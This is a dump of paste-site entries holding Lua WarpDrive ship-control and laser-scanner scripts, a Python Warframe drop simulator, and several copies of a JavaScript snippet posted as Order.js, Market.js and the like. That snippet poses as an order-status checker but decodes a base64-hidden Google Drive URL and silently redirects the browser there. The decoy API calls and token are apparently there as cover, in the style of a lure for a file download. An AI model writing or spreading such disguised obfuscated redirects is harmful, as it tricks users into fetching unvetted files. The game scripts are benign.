  w.setColorNormal()
  
  w.write("":"")
  ship.command(""SUMMON"", false)
  local input = w.input_readInteger("""")
  if input == """" then
    ship.targetName("""")
  else
    input = tonumber(input)
    ship.targetName(arrayPlayers[input - 1])
  end
  ship.command(""SUMMON"", true)
end

function ship_page_jumpToGate()
  w.page_begin(""<==== Jump through Jumpgate ====>"")
  w.writeLn("""")
  w.writeLn(""Your ship should be already inside a jumpgate"")
  
  w.setCursorPos(1, 16)
  w.setColorHelp()
  w.writeFullLine("" Enter target jumpgate name (a-z, 0-9)."")
  w.writeFullLine("" Press enter to save jumpgate name."")
  
  w.setCursorPos(1, 5)
  w.setColorNormal()
  w.write(""Target jumpgate name: "")
  local targetName = w.input_readText("""")
  -- rs.setOutput(alarm_side, true)
  if w.input_readConfirmation(""Engage gate jumping? (Y/n)"") then
    -- rs.setOutput(alarm_side, false)
    ship.command(""GATE"", false)
    ship.targetName(targetName)
    ship.command(""GATE"", true)
    -- ship = nil
  end
  -- rs.setOutput(alarm_side, false)
end

function ship_page_controls()
  w.page_begin(w.data_getName() .. "" - Ship controls"")
  if ship == nil or ship.isInterfaced() == nil then
    w.status_showWarning(""No ship controller detected"")
  else
    local isValid, message = ship.getAssemblyStatus()
    if isValid ~= true then
      w.status_showWarning(message)
    else
      local isEnabled = ship.enable()
      if not isEnabled then
        ship.command(""MANUAL"", false)
        ship_updateMovementStats()
      end
    end
    
    w.setCursorPos(1, 2)
    w.writeLn(""Ship:"")
    w.writeLn("" Current position = "" .. w.format_integer(ship_x) .. "", "" .. w.format_integer(ship_y) .. "", "" .. w.format_integer(ship_z))
    local energyStored, energyMax, energyUnits = ship.getEnergyStatus()
    if energyStored == nil then energyStored = 0 end
    if energyMax == nil or energyMax == 0 then energyMax = 1 end
    w.writeLn("" Energy           = "" .. math.floor(energyStored / energyMax * 100) .. "" % ("" .. w.format_integer(energyStored) .. "" "" .. energyUnits .. "")"")
    
    w.writeLn("""")
    w.writeLn(""Dimensions:"")
    w.writeLn("" Front, Right, Up = "" .. w.format_integer(ship_front) .. "", "" .. w.format_integer(ship_right) .. "", "" .. w.format_integer(ship_up) .. "" blocks"")
    w.writeLn("" Back, Left, Down = "" .. w.format_integer(ship_back) .. "", "" .. w.format_integer(ship_left) .. "", "" .. w.format_integer(ship_down) .. "" blocks"")
    local shipMass, shipVolume = ship.getShipSize()
    if shipMass == nil then
      shipMass = 0
      shipVolume = 0
    end
    w.write("" Mass, Volume     = "")
    if shipMass == 0 then
      w.write(""?"")
    else
      w.write(w.format_integer(shipMass))
    end
    w.write("" tons, "")
    if shipVolume == 0 then
      w.write(""?"")
    else
      w.write(w.format_integer(shipVolume))
    end
    w.writeLn("" blocks"")
    
    if isValid == true then
      w.writeLn("""")
      w.writeLn(""Warp data:"")
      ship_writeMovement("" Movement         = "")
      w.writeLn("" Distance         = "" .. w.format_integer(ship_actualDistance) .. "" m ("" .. w.format_integer(ship_energyRequired) .. "" "" .. energyUnits .. "", "" .. math.floor(energyStored / ship_energyRequired) .. "" jumps)"")
      w.writeLn("" Target position  = "" .. w.format_integer(ship_xTarget) .. "", "" .. w.format_integer(ship_yTarget) .. "", "" .. w.format_integer(ship_zTarget))
    end
  end
  
  w.setCursorPos(1, 16)
  w.setColorControl()
  w.writeFullLine("" set ship Name (N), dImensions (I), Movement (M/P)"")
  if ship_isInHyper then
    w.writeFullLine("" Jump to move ship (J), exit Hyperspace (H)"")
  else
    w.writeFullLine("" Jump to move ship (J), enter Hyperspace (H)"")
  end
end

function ship_key_controls(character, keycode)
  if character == 'm' or character == 'M' then
    ship_page_setMovement(false)
    ship_page_setRotation()
    ship_warp()
    return true
  elseif character == 'p' or character == 'P' then
    ship_page_setMovement(true)
    ship_page_setRotation()
    ship_warp()
    return true
  elseif character == 'i' or character == 'I' then
    ship_page_setDimensions()
    return true
  elseif character == 'j' or character == 'J' then
    ship_warp()
    return true
  elseif character == 'h' or character == 'H' then
    -- rs.setOutput(alarm_side, true)
    local isConfirmed
    if ship_isInHyper then
      isConfirmed = w.input_readConfirmation(""Disengage hyperdrive? (Y/n)"")
    else
      isConfirmed = w.input_readConfirmation(""Engage hyperdrive? (Y/n)"")
    end
    if isConfirmed then
      -- rs.setOutput(alarm_side, false)
      ship.command(""HYPERDRIVE"", true)
      ship_updateMovementStats()
      -- ship = nil
    end
    -- rs.setOutput(alarm_side, false)
    return true
  elseif character == 'n' or character == 'N' then
    w.data_setName()
    return true
  end
  return false
end

function ship_writeArray(arrayValues, indexSelected)
  if indexSelected then
    indexSelected = (indexSelected + #arrayValues) % #arrayValues
  end
  
  local indexSplit = math.ceil(#arrayValues / 2)
  for i = 1, indexSplit do
    if indexSelected and i == indexSelected + 1 then
      w.setColorSelected()
      w.write("">"" .. string.sub(arrayValues[i] .. ""                        "", 1, 24))
      w.setColorNormal()
    else
      w.write("" "" .. string.sub(arrayValues[i] .. ""                        "", 1, 24))
    end
    if arrayValues[i + indexSplit] ~= nil then
      if indexSelected and i + indexSplit == indexSelected + 1 then
        w.setColorSelected()
        w.writeLn("">"" .. string.sub(arrayValues[i + indexSplit] .. ""                        "", 1, 24))
        w.setColorNormal()
      else
        w.writeLn("" "" .. arrayValues[i + indexSplit])
      end
    else
      w.writeLn("""")
    end
  end
  return indexSelected
end

function ship_page_crew()
  w.page_begin(w.data_getName() .. "" - Ship crew"")
  if ship == nil or ship.isInterfaced() == nil then
    w.status_showWarning(""No ship controller detected"")
  else
    local isValid, message = ship.getAssemblyStatus()
    if isValid ~= true then
      w.status_showWarning(message)
    else
      w.writeLn(""Attached players:"")
      -- local stringPlayers, _ = ship.getAttachedPlayers()
      if stringPlayers == nil or stringPlayers == """" then
        stringPlayers = ""~ no registered player ~""
      end
      ship_arrayPlayers = w.data_splitString(stringPlayers, "","")
      ship_indexPlayer = ship_writeArray(ship_arrayPlayers, ship_indexPlayer)
    end
  end
  
  w.setCursorPos(1, 16)
  w.setColorControl()
  w.writeFullLine("" Summon all crew (S)"")
  w.writeFullLine("" select crew (Up, Down), summon slctd crew (enter)"")
end

function ship_key_crew(character, keycode)
  if character == 's' or character == 'S' then -- S
    ship.command(""SUMMON"", false)
    ship.targetName("""")
    ship.command(""SUMMON"", true)
    return true
  elseif keycode == 28 then -- Enter
    local namePlayer = ship_arrayPlayers[ship_indexPlayer + 1]
    ship.command(""SUMMON"", false)
    ship.targetName(namePlayer)
    ship.command(""SUMMON"", true)
    w.status_showSuccess(""Engaging teleportation for "" .. namePlayer .. ""..."")
    return true
  elseif keycode == 200 or keycode == 203 or character == '-' then -- Up or Left or -
    ship_indexPlayer = ship_indexPlayer - 1
    return true
  elseif keycode == 208 or keycode == 205 or character == '+' then -- Down or Right or +
    ship_indexPlayer = ship_indexPlayer + 1
    return true
  end
  return false
end

function ship_page_navigation()
  w.page_begin(w.data_getName() .. "" - Ship navigation"")
  if ship == nil or ship.isInterfaced() == nil then
    w.status_showWarning(""No ship controller detected"")
  else
    local isValid, message = ship.getAssemblyStatus()
    if isValid ~= true then
      w.status_showWarning(message)
    else
      local locationCurrent = ""somewhere...""  -- @TODO ship.getLocation()
      w.writeLn(""Current ship location        : "" .. locationCurrent)
      w.writeLn(""Jumpgates or beacons in range:"")
      local stringTargets, _ = ""not implemented"", nil -- ship.getTargets()
      if stringTargets == nil or stringTargets == """" then
        stringTargets = ""~ no beacon nor jumpgate in range ~""
      end
      local arrayTargets = w.data_splitString(stringTargets, "","")
      ship_indexTarget = ship_writeArray(arrayTargets, ship_indexTarget)
    end
  end
  
  w.setCursorPos(1, 16)
  w.setColorControl()
  w.writeFullLine("" select target (Up, Down), register target (enter)"")
  w.writeFullLine("" jump through Gate (G)"")
end

function ship_key_navigation(character, keycode)
  if keycode == 28 then -- Enter
--    local success, xxx = ship.xxx(ship_indexTarget)
--    if success then
--      w.status_showSuccess(""Engaging jumpgate jump to "" .. xxx .. ""..."")
--    else
--      w.status_showWarning(""Failed to summon crew member"")
--    end
    return true
--  elseif character == 'b' or character == 'B' then -- B
--    ship_page_jumpToBeacon()
--    return true
  elseif character == 'g' or character == 'G' then -- G
    ship_page_jumpToGate()
    return true
  elseif keycode == 200 or keycode == 203 or character == '-' then -- Up or Left or -
    ship_indexTarget = ship_indexTarget - 1
    return true
  elseif keycode == 208 or keycode == 205 or character == '+' then -- Down or Right or +
    ship_indexTarget = ship_indexTarget + 1
    return true
  end
  return false
end

function ship_page_advanced()
  w.page_begin(w.data_getName() .. "" - Advanced"")
  
  w.setCursorPos(1, 5)
  local status, isEnabled, state, energy = ship.state()
  w.writeLn(""Ship is in "" .. state .. "" mode"")
  
  w.setCursorPos(1, 16)
  w.setColorControl()
  w.writeFullLine("" OFFLINE/disabled mode (O), MAINTENANCE mode (M)"")
  w.writeFullLine("" IDLE/online mode (I)"")
end

function ship_key_advanced(character, keycode)
  if character == 'o' or character == 'O' then -- O
    ship.command(""OFFLINE"", false)
    ship.command(""OFFLINE"", true)
    ship.enable(false)
    return true
  elseif character == 'm' or character == 'M' then -- M
    ship.command(""MAINTENANCE"", false)
    ship.enable(true)
    ship.command(""MAINTENANCE"", true)
    return true
  elseif character == 'i' or character == 'I' then -- I
    ship.command(""IDLE"", false)
    ship.enable(true)
    ship.command(""IDLE"", true)
    return true
  end
  return false
end

function ship_register()
  w.device_register(""warpdriveShipController"",
      function(deviceType, address, wrap) ship = wrap end,
      function() end)
  w.device_register(""warpdriveShipCore"",
      function(deviceType, address, wrap) ship = wrap end,
      function() end)
  w.event_register(""shipCoreCooldownDone""  , function() w.status_showWarning(""Ship core cooldown done"")   return false end )
  w.data_register(""ship"", ship_read, nil, ship_name)
end

----------- connections status

function connections_page(isBooting)
  w.page_begin(w.data_getName() .. "" - Connections"")
  
  w.writeLn("""")
  
  local monitors = w.device_getMonitors()
  if #monitors == 0 then
    w.setColorDisabled()
    w.writeLn(""No Monitor detected"")
  elseif #monitors == 1 then
    w.setColorSuccess()
    w.writeLn(""1 monitor detected"")
  else
    w.setColorSuccess()
    w.writeLn(#monitors .. "" Monitors detected"")
  end
  
  if ship == nil or ship.isInterfaced() == nil then
    w.setColorDisabled()
    w.writeLn(""No ship controller detected"")
  else
    w.setColorSuccess()
    w.writeLn(""Ship controller detected"")
    if isBooting then
      ship_boot()
    end
  end
  
  w.writeLn("""")
  w.setColorNormal()
  w.writeLn(""This is a keyboard controlled user interface."")
  w.write(""Key controls are written like so: "")
  w.setColorControl()
  w.write(""Action (key)"")
  w.setColorNormal()
  w.writeLn(""."")
  w.write(""For example, typing "")
  w.setColorControl()
  w.write("" 1 "")
  w.setColorNormal()
  w.writeLn("" will open Ship controls."")
end

----------- Boot sequence

w.page_setEndText("" Home (0), Ctrl (1), Crew (2), Nav (3), Advncd (4) "")
w.page_register('0', connections_page, nil)
w.page_register('1', ship_page_controls, ship_key_controls)
w.page_register('2', ship_page_crew, ship_key_crew)
w.page_register('3', ship_page_navigation, ship_key_navigation)
w.page_register('4', ship_page_advanced, ship_key_advanced)
ship_register()

w.boot()
local success, message = pcall(w.run)
if not success then
  print(""failed with message"")
  print(message)
  w.sleep(3.0)
  print(""rebooting..."")
  w.reboot()
else
  if ship ~= nil then
    ship.command(""OFFLINE"", true)
    ship.enable(false)
  end
  
  w.close()
end"
EzN3mZ7d,激光扫描发射器 三维定位,jaklsfjlsak,Lua,Sunday 20th of April 2025 06:53:48 PM CDT,"local lasers = peripheral.getNames()

rednet.open(""top"")
 
for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Emit Scanning Laser to Target a Block"")
 
while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()
 
    if event == ""laserScanning"" then
        -- Convert the laser scanning coordinates to numbers and store them
        local lastLx = tonumber(lx)
        local lastLy = tonumber(ly)
        local lastLz = tonumber(lz)
        
        
        print(""Laser target: X:"" .. lastLx .. "" Y:"" .. lastLy .. "" Z:"" .. lastLz)

            -- Package the coordinates into a table (you can also send a formatted string)
            local data = { x = lastLx, y = lastLy, z = lastLz }
            
            -- Broadcast the coordinates using a custom protocol (""coordBroadcast"")
            rednet.broadcast(data, ""3DOffsetBroadcast"")
end
end
"
BT7Bbqag,激光扫描发射器 水平跳船 采矿激光对齐,jaklsfjlsak,Lua,Sunday 20th of April 2025 06:52:52 PM CDT,"local lasers = peripheral.getNames()

rednet.open(""top"")
 
for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Emit Scanning Laser to Target a Block"")
 
while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()
 
    if event == ""laserScanning"" then
        -- Convert the laser scanning coordinates to numbers and store them
        local lastLx = tonumber(lx)
        local lastLy = tonumber(ly)
        local lastLz = tonumber(lz)
        
        
        print(""Laser target: X:"" .. lastLx .. "" Y:"" .. lastLy .. "" Z:"" .. lastLz)

            -- Package the coordinates into a table (you can also send a formatted string)
            local data = { x = lastLx, y = lastLy, z = lastLz }
            
            -- Broadcast the coordinates using a custom protocol (""coordBroadcast"")
            rednet.broadcast(data, ""HorizontalJumpMinerBroadcast"")
end
end
"
fX8ii1TX,Untitled,Epiphemeral,JavaScript,Sunday 20th of April 2025 06:52:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03842/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tQZCVcfA,激光扫描发射器 水平跳船,jaklsfjlsak,Lua,Sunday 20th of April 2025 06:52:12 PM CDT,"local lasers = peripheral.getNames()

rednet.open(""top"")
 
for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Emit Scanning Laser to Target a Block"")
 
while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()
 
    if event == ""laserScanning"" then
        -- Convert the laser scanning coordinates to numbers and store them
        local lastLx = tonumber(lx)
        local lastLy = tonumber(ly)
        local lastLz = tonumber(lz)
        
        
        print(""Laser target: X:"" .. lastLx .. "" Y:"" .. lastLy .. "" Z:"" .. lastLz)

            -- Package the coordinates into a table (you can also send a formatted string)
            local data = { x = lastLx, y = lastLy, z = lastLz }
            
            -- Broadcast the coordinates using a custom protocol (""coordBroadcast"")
            rednet.broadcast(data, ""HorizontalJumpBroadcast"")
end
end
"
av5VUBwn,激光扫描发射器 水平采矿,jaklsfjlsak,Lua,Sunday 20th of April 2025 06:51:17 PM CDT,"local lasers = peripheral.getNames()

rednet.open(""top"")
 
for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Emit Scanning Laser to Target a Block"")
 
while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()
 
    if event == ""laserScanning"" then
        -- Convert the laser scanning coordinates to numbers and store them
        local lastLx = tonumber(lx)
        local lastLy = tonumber(ly)
        local lastLz = tonumber(lz)
        
        
        print(""Laser target: X:"" .. lastLx .. "" Y:"" .. lastLy .. "" Z:"" .. lastLz)

            -- Package the coordinates into a table (you can also send a formatted string)
            local data = { x = lastLx, y = lastLy, z = lastLz }
            
            -- Broadcast the coordinates using a custom protocol (""coordBroadcast"")
            rednet.broadcast(data, ""SMineBroadcast"")
end
end
"
bs9PxetJ,Order.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 06:47:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42020/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0EL2czmp,Market.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 06:32:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88900/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hHrRHb9H,Warframe Shards Simulation,Kyloooooo,Python,Sunday 20th of April 2025 06:22:48 PM CDT,"import random

def generate_reward(rewards, weights):
    # Define the rewards and their corresponding drop rates

    # Randomly select a reward based on the weights
    return random.choices(rewards, weights=weights, k=1)[0]

def archon_hunt(tauforged_chance, shard_type):
    # Map shard_type to the corresponding shard names
    shard_mapping = {
        0: ""Azure Archon Shard"",
        1: ""Crimson Archon Shard"",
        2: ""Amber Archon Shard""
    }

    tauforged_shard_mapping = {
        0: ""Tauforged Azure Archon Shard"",
        1: ""Tauforged Crimson Archon Shard"",
        2: ""Tauforged Amber Archon Shard""
    }

    # Determine if a Tauforged item drops
    if random.random() < tauforged_chance:
        # Return the corresponding Tauforged shard
        return tauforged_shard_mapping[shard_type]
    else:
        # Return the normal version of the shard
        return shard_mapping[shard_type]
    

def generate_non_tauforged_shard():
    # Define the non-Tauforged shards and their corresponding drop rates
    non_tauforged_shards = [
        ""Crimson Archon Shard"", ""Azure Archon Shard"", ""Amber Archon Shard"",
        ""Topaz Archon Shard"", ""Emerald Archon Shard"", ""Violet Archon Shard"",
    ]
    weights = [0.1667, 0.1667, 0.1667, 0.1667, 0.1667, 0.1667]

    # Randomly select a shard based on the weights
    return random.choices(non_tauforged_shards, weights=weights, k=1)[0]
    

def generate_non_tauforged_standard_shard():
    # Define the non-Tauforged shards and their corresponding drop rates
    non_tauforged_shards = [
        ""Crimson Archon Shard"", ""Azure Archon Shard"", ""Amber Archon Shard"",
    ]
    weights = [0.33333, 0.33333, 0.33333]

    # Randomly select a shard based on the weights
    return random.choices(non_tauforged_shards, weights=weights, k=1)[0]


def add_or_increment(dictionary, key):
    if key in dictionary:
        dictionary[key] += 1
    else:
        dictionary[key] = 1


def calculate_average_rewards(reward_dicts):
    # Initialize a dictionary to accumulate total counts
    total_counts = {}

    # Iterate over each dictionary in the list
    for reward_dict in reward_dicts:
        for reward, count in reward_dict.items():
            if reward in total_counts:
                total_counts[reward] += count
            else:
                total_counts[reward] = count

    # Calculate the average counts
    num_dicts = len(reward_dicts)
    average_counts = {reward: total_count / num_dicts for reward, total_count in total_counts.items()}

    return average_counts


def count_tauforged_and_non_tauforged(average_rewards):
    tauforged_count = 0
    non_tauforged_count = 0

    for reward, count in average_rewards.items():
        if ""Tauforged"" in reward:
            tauforged_count += count
        else:
            non_tauforged_count += count

    return round(tauforged_count,3), round(non_tauforged_count, 3)


temporal_silver_drops = [
    ""Arcane Escapist"", ""Arcane Hot Shot"", ""Arcane Universal Fallout"",
    ""Elemental Vice"", ""Crimson Archon Shard"", ""Azure Archon Shard"",
    ""Amber Archon Shard"", ""Tauforged Crimson Archon Shard"",
    ""Tauforged Azure Archon Shard"", ""Tauforged Amber Archon Shard"",
    ""Omni Forma Blueprint""
]
temporal_silver_weights = [
    0.0876, 0.0876, 0.0876, 0.1314, 0.1533, 0.1533, 0.1533,
    0.0365, 0.0365, 0.0365, 0.0365
]
    
temporal_gold_drops = [
        ""Arcane Escapist"", ""Arcane Hot Shot"", ""Arcane Universal Fallout"",
        ""Elemental Vice"", ""Crimson Archon Shard"", ""Azure Archon Shard"",
        ""Amber Archon Shard"", ""Tauforged Crimson Archon Shard"",
        ""Tauforged Azure Archon Shard"", ""Tauforged Amber Archon Shard"",
        ""Emerald Archon Shard"", ""Topaz Archon Shard"", ""Violet Archon Shard"",
        ""Tauforged Emerald Archon Shard"", ""Tauforged Topaz Archon Shard"",
        ""Tauforged Violet Archon Shard"", ""Omni Forma""
    ]
temporal_gold_weights = [
        0.0851, 0.0851, 0.0851, 0.0284, 0.0745, 0.0745, 0.0745,
        0.0484, 0.0484, 0.0484, 0.0559, 0.0559, 0.0559,
        0.0364, 0.0364, 0.0364, 0.0709
    ]

temporal_arcane_drops = [
    ""Arcane Escapist"", ""Arcane Hot Shot"", ""Arcane Universal Fallout"",
    ""Tauforged Crimson Archon Shard"", ""Tauforged Azure Archon Shard"",
    ""Tauforged Amber Archon Shard"", ""Tauforged Emerald Archon Shard"",
    ""Tauforged Topaz Archon Shard"", ""Tauforged Violet Archon Shard"",
    ""Omni Forma""
]
temporal_arcane_weights = [0.1366, 0.1366, 0.1366, 0.0911, 0.0911, 0.0911, 0.0683, 0.0683, 0.0683, 0.1120]

deep_silver_rewards = [
    ""Melee Duplicate"", ""Melee Crescendo"", ""Melee Arcane Adapter"",
    ""Crimson Archon Shard"", ""Azure Archon Shard"", ""Amber Archon Shard"",
    ""Tauforged Crimson Archon Shard"", ""Tauforged Azure Archon Shard"", ""Tauforged Amber Archon Shard""
]
deep_silver_weights = [
    0.1000, 0.1000, 0.1500, 0.1750, 0.1750, 0.1750, 0.0417, 0.0417, 0.0417
]

deep_gold_rewards = [
    ""Melee Duplicate"", ""Melee Crescendo"", ""Melee Arcane Adapter"",
    ""Crimson Archon Shard"", ""Azure Archon Shard"", ""Amber Archon Shard"",
    ""Tauforged Crimson Archon Shard"", ""Tauforged Azure Archon Shard"", ""Tauforged Amber Archon Shard""
]
deep_gold_weights = [
    0.1500, 0.1500, 0.0500, 0.1313, 0.1313, 0.1313, 0.0854, 0.0854, 0.0854
]

deep_arcane_rewards = [
    ""Melee Duplicate"", ""Melee Crescendo"",
    ""Tauforged Crimson Archon Shard"", ""Tauforged Azure Archon Shard"", ""Tauforged Amber Archon Shard""
]
deep_arcane_weights = [
    0.2500, 0.2500, 0.1667, 0.1667, 0.1667
]

netracell_rewards = [
    ""Crimson Archon Shard"", ""Azure Archon Shard"", ""Amber Archon Shard"",
    ""Melee Arcane Adapter"", ""Melee Crescendo"", ""Melee Duplicate"",
    ""Tauforged Crimson Archon Shard"", ""Tauforged Azure Archon Shard"", ""Tauforged Amber Archon Shard""
]
netracell_weights = [
    0.1750, 0.1750, 0.1750, 0.1500, 0.1000, 0.1000, 0.0417, 0.0417, 0.0417
]


def main():
    archon_hunt_key = 0
    tauforged_chance = 0.20  # Example chance for Tauforged shard in archon hunt
    rewards_list = []

    # Simulate the rewards for 1000000 iterations
    for i in range(1000000):
        rewards = dict()
        # Deep Archimedean Hunt
        reward = generate_reward(deep_silver_rewards, deep_silver_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(deep_silver_rewards, deep_silver_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(deep_gold_rewards, deep_gold_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(deep_gold_rewards, deep_gold_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(deep_arcane_rewards, deep_arcane_weights)
        add_or_increment(rewards, reward)

        # Temporal Hunt
        reward = generate_reward(temporal_silver_drops, temporal_silver_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(temporal_silver_drops, temporal_silver_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(temporal_gold_drops, temporal_gold_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(temporal_gold_drops, temporal_gold_weights)
        add_or_increment(rewards, reward)
        reward = generate_reward(temporal_arcane_drops, temporal_arcane_weights)
        add_or_increment(rewards, reward)

        # Archon Hunt
        reward = archon_hunt(tauforged_chance, archon_hunt_key)  # 0 for Azure Archon Shard
        archon_hunt_key = (archon_hunt_key + 1) % 3
        if reward.startswith(""Tauforged""):
            tauforged_chance = 0.20
        else:
            tauforged_chance += 0.20 
        add_or_increment(rewards, reward)

        # Netracell Hunt
        reward = generate_reward(netracell_rewards, netracell_weights)
        add_or_increment(rewards, reward)

        # 1999 Calendar Reward
        reward = generate_non_tauforged_shard()
        add_or_increment(rewards, reward)

        # Bird 3 Shard
        reward = generate_non_tauforged_standard_shard()
        add_or_increment(rewards, reward)

        # Order the rewards by amount
        rewards = dict(sorted(rewards.items(), key=lambda item: item[1], reverse=True))

        # Append the rewards to the list
        rewards_list.append(rewards)

        ### END OF SIMULATION ###


    # Calculate the average rewards
    average_rewards = calculate_average_rewards(rewards_list)
    
    # Sort the average rewards by amount
    average_rewards = dict(sorted(average_rewards.items(), key=lambda item: item[1], reverse=True))
    
    # Print the average rewards
    print(""Average Rewards:"")
    for reward, count in average_rewards.items():
        print(f""{reward}: {count:.2f}"")

    # Count Tauforged and non-Tauforged rewards
    tauforged_count, non_tauforged_count = count_tauforged_and_non_tauforged(average_rewards)
    print(f""\nTotal Tauforged Shards: {tauforged_count}"")
    print(f""Total Non-Tauforged Shards: {non_tauforged_count}"")
    print(f""\'Combined' Tauforged Shards: {round(tauforged_count + non_tauforged_count/3, 3)}"")

if __name__ == ""__main__"":
    main()"
p9bfyJ48,Untitled,hubertzoo90,JavaScript,Sunday 20th of April 2025 06:16:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71742/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kyXfE1Sz,Products.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 06:01:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91726/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

